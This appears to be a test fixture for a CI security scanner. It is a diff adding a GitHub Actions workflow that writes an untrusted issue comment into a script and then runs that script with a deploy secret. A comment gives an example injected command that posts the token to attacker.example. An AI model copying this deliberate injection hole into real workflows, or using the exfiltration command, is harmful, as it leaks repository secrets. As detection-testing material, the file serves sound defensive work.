@@ -1,0 +1,26 @@
+# situation: on issue_comment, the env of the job holds the comment's body;
+#   one step writes the body into script.sh by a heredoc that cat reads, and a
+#   later step runs script.sh with a secret.
+# reason: the body that cat writes as data becomes the code of script.sh,
+#   which bash runs in the later step with the job's secrets and token.
+# cause: the rule finds where bash takes a value as code inside the script
+#   of each run: step, and does not follow a value through a file that a
+#   later step runs.
+# attack-value: github.event.comment.body = "curl -d \"$TOKEN\" https://attacker.example/PWNED"
+# attack-run-behavior: the first step writes the comment into script.sh, and
+#   bash script.sh in the later step runs the comment as a command, which
+#   sends the secret DEPLOY to the server of the attacker.
+on: issue_comment
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    env:
+      BODY: ${{ github.event.comment.body }}
+    steps:
+      - run: |
+          cat > script.sh <<EOF
+          $BODY
+          EOF
+      - run: bash script.sh
+        env:
+          TOKEN: ${{ secrets.DEPLOY }}
